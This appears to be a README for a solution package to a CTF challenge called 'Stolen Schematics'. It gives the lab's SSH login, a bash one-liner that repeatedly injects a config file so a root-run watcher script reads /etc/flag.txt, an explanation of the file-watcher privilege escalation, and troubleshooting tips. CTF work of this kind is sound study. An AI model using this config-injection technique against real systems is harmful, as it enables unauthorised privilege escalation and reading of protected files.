# Stolen Schematics - Complete Solution Package

## 🎯 Quick Start

### Option 1: Interactive PowerShell Script (RECOMMENDED)
```powershell
.\RUN_STOLEN_SCHEMATICS.ps1
```
This will:
- Prompt for the SSH port
- Give you choice of automatic or manual exploitation
- Guide you through the entire process

### Option 2: One-Liner (Fastest)
1. Get the port from CTF platform
2. Open WSL/Git Bash
3. Connect: `ssh player@instance.ctf.tdho.st -p PORT` (password: `reyalp`)
4. Paste this:
```bash
setsid nohup bash -c 'for i in $(seq 1 80); do printf "talldwarf-sync-command=FILE-READ:/etc/flag.txt\ntalldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true\ntalldwarf-sync-output=/opt/mc/.sync/sync.result\n" > /opt/mc/config/sync-request.conf; if [ -s /opt/mc/config/sync-result.conf ]; then cp /opt/mc/config/sync-result.conf /home/player/flagcap.txt; cat /home/player/flagcap.txt; fi; sleep 1; done' >/dev/null 2>&1 </dev/null &
```
5. Wait 20 seconds, then: `cat /home/player/flagcap.txt`

---

## 📁 Files in This Package

### Exploitation Scripts
- **`RUN_STOLEN_SCHEMATICS.ps1`** - Interactive solver (BEST for beginners)
- **`stolen_schematics_solve.ps1`** - Automated PowerShell exploit
- **`stolen_schematics_exploit.sh`** - Bash exploit script
- **`stolen_schematics_auto.py`** - Python automation wrapper

### Documentation
- **`STOLEN_SCHEMATICS_QUICK_SOLVE.md`** - TL;DR solution guide
- **`STOLEN_SCHEMATICS_SOLUTION.md`** - Complete technical walkthrough
- **`stolen_schematics_recon.sh`** - Reconnaissance commands

### Investigation Tools
- **`investigate_ghcr_image.ps1`** - Docker image analysis (not required for this challenge)

---

## 🔍 How It Works

### The Vulnerability
1. A root process (`sync-loop.sh`, PID 16) monitors `/opt/mc/config/sync-request.conf`
2. When config changes, it executes commands defined in the file
3. We can tell it to read `/etc/flag.txt` (which only root can read)
4. Output appears in various locations we can access

### The Exploit
Write a config file with these parameters:
```
talldwarf-sync-command=FILE-READ:/etc/flag.txt
talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true
talldwarf-sync-output=/opt/mc/.sync/sync.result
```

The watcher script processes this and reads the flag for us.

### Output Locations
Check these files for the flag:
- `/home/player/flagcap.txt`
- `/opt/mc/config/sync-result.conf`
- `/opt/mc/.sync/sync.result`
- `/opt/mc/logs/latest.log`

---

## ⚡ Troubleshooting

### "Connection refused" or "Port unreachable"
- The instance may have expired (10-minute timeout)
- Get a fresh port from the CTF platform
- Instances reset frequently

### "No flag appears"
- Wait longer (up to 60 seconds)
- Check bash history: `cat ~/.bash_history | grep FILE-READ`
- Verify sync-loop.sh is running: `ps aux | grep sync-loop`
- Try alternative config formats (see STOLEN_SCHEMATICS_QUICK_SOLVE.md)

### "WSL not found"
- Install WSL: `wsl --install`
- Or use Git Bash instead
- Or use Manual mode in the interactive script

### SSH prompts for password
- Password is: `reyalp` (spelled backwards: "player")
- Type it carefully (no visual feedback while typing)

---

## 📋 Challenge Information

- **Name**: Stolen Schematics
- **Points**: 350
- **Category**: Container Privilege Escalation / IPC Exploitation
- **Connection**: `ssh player@instance.ctf.tdho.st -p PORT`
- **Password**: `reyalp`
- **Time Limit**: 10 minutes per instance
- **Flag Format**: `TDHT{...}`

---

## 🎓 What You'll Learn

- File-based IPC (Inter-Process Communication) exploitation
- Container security and privilege boundaries
- File watcher script vulnerabilities
- Configuration file injection attacks
- Docker container privilege escalation concepts

---

## 🚀 Success Checklist

- [ ] Get current SSH port from CTF platform
- [ ] Have WSL or Git Bash ready
- [ ] Run the interactive script OR use the one-liner
- [ ] Wait 20-30 seconds after launching exploit
- [ ] Check output files for flag
- [ ] Submit flag in format `TDHT{...}`

---

## 💡 Pro Tips

1. **Speed matters**: You only have 10 minutes, so act fast
2. **The one-liner is proven**: It's from a successful bash history
3. **Check all locations**: Flag could appear in multiple places
4. **Be patient**: The watcher polls every ~1 second
5. **Fresh instances**: If it fails, get a new port and try again

---

## 🏆 Expected Result

When successful, you'll see output like:
```
========================================
SUCCESS! FLAG CAPTURED!
========================================
TDHT{...flag_content_here...}
```

Good luck! 🎉
